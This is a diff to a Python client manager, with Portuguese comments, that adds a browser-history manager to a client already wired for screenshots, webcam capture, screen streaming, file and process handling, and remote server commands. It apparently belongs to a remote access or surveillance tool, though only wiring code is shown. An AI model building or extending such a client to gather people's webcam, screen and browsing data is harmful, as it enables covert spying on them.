@@ -9,6 +9,7 @@ from managers.screenshot_manager import ScreenshotManager
 from managers.webcam_manager import WebcamManager
 from managers.screen_stream_manager import ScreenStreamManager
 from managers.file_manager import FileManager
+from managers.browser_history_manager import BrowserHistoryManager
 logger = logging.getLogger("client.client_manager")
 class ClientManager:
     def __init__(self, server_host, server_port):
@@ -19,6 +20,7 @@ class ClientManager:
         self.webcam_manager = WebcamManager()
         self.screen_stream_manager = ScreenStreamManager()
         self.file_manager = FileManager()
+        self.browser_history_manager = BrowserHistoryManager()  # Novo gerenciador de histórico
         self.connector = ClientConnector(server_host, server_port)
         self.data_sender = DataSender(self.connector, self.system_manager)
         self.command_handler = CommandHandler(
@@ -28,7 +30,8 @@ class ClientManager:
             self.screenshot_manager,
             self.webcam_manager,
             self.screen_stream_manager,
-            self.file_manager
+            self.file_manager,
+            self.browser_history_manager  # Adicionado o gerenciador de histórico
         )
         self.connector.set_handlers(self.command_handler, self.data_sender)
     def start(self):
@@ -40,6 +43,7 @@ class ClientManager:
         self.webcam_manager.start()
         self.screen_stream_manager.start()
         self.file_manager.start()
+        self.browser_history_manager.start()  # Iniciar o gerenciador de histórico
         system_info = self.system_manager.get_info()
         connection_success = self.connector.connect(system_info)
         if connection_success:
@@ -57,4 +61,5 @@ class ClientManager:
         self.screenshot_manager.stop()
         self.process_manager.stop()
         self.system_manager.stop()
+        self.browser_history_manager.stop()  # Parar o gerenciador de histórico
         logger.info("Client stopped successfully")
